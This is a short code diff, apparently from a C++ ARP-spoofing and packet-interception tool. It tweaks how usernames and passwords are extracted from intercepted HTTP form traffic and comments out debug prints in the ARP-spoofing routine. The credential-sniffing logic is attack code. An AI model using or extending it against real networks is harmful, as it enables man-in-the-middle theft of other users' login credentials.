@@ -226,7 +226,6 @@ void arp_request(const char *if_name, const char *base_ip)
             cerr << "Error sending packet." << endl;
         }
     }
-
     stop_receiving = true;
     receive_thread.join();
 
@@ -362,7 +361,7 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
             {
                 cout << "Username: " << payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12) << endl;
                 // after & is password txtPassword=
-                cout << "Password: " << payload.substr(payload.find("txtPassword") + 12, payload.find("&", payload.find("txtPassword")) - payload.find("txtPassword") - 12) << endl;
+                cout << "Password: " << payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12) << endl;
             }
         }
     }
@@ -428,10 +427,10 @@ void analyze_packet(){
 void arp_spoofing()
 {
     string gateway_mac = devices[gateway_ip];
-    cout << "Gateway IP: " << gateway_ip << endl;
-    cout << "Gateway MAC: " << gateway_mac << endl;
-    cout << "Source IP: " << source_ip << endl;
-    cout << "Source MAC: " << source_mac << endl;
+    // cout << "Gateway IP: " << gateway_ip << endl;
+    // cout << "Gateway MAC: " << gateway_mac << endl;
+    // cout << "Source IP: " << source_ip << endl;
+    // cout << "Source MAC: " << source_mac << endl;
     // change string of mac to unsigned char[6]
     unsigned char gateway_mac_char[6];
     sscanf(gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
